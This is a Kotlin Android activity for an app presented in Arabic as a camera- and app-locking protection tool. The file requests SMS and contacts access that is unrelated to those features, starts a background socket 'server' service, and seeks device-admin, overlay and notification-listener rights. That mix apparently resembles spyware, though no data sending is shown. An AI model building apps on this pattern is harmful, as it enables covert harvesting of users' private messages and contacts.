package com.ahmed.zai

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.Switch
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val switchCamera = findViewById<Switch>(R.id.switchCamera)
        val switchApps = findViewById<Switch>(R.id.switchApps)
        val switchNotif = findViewById<Switch>(R.id.switchNotifications)
        val btnAdmin = findViewById<Button>(R.id.btnAdmin)
        val statusText = findViewById<TextView>(R.id.statusText)

        // طلب صلاحيات
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), 101)
        }
        ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_SMS, android.Manifest.permission.READ_CONTACTS), 102)

        // تشغيل السيرفر في الخلفية
        startService(Intent(this, SocketService::class.java))

        // أزرار الحماية
        btnAdmin.setOnClickListener {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            startActivity(intent)
        }

        switchCamera.setOnCheckedChangeListener { _, isChecked ->
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(adminComponent)) {
                dpm.setCameraDisabled(adminComponent, isChecked)
                statusText.text = if(isChecked) "📸 الكاميرا مقفولة تماماً" else "📸 الكاميرا مفتوحة"
                statusText.setTextColor(if(isChecked) 0xFF00FF00.toInt() else 0xFFef4444.toInt())
            }
        }

        switchApps.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                if (!Settings.canDrawOverlays(this)) {
                    startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
                }
                statusText.text = "🔒 تم تفعيل حماية التطبيقات (الغرف المغلقة)"
            }
        }

        switchNotif.setOnCheckedChangeListener { _, isChecked ->
            if (isChecked) {
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
        }
    }
}
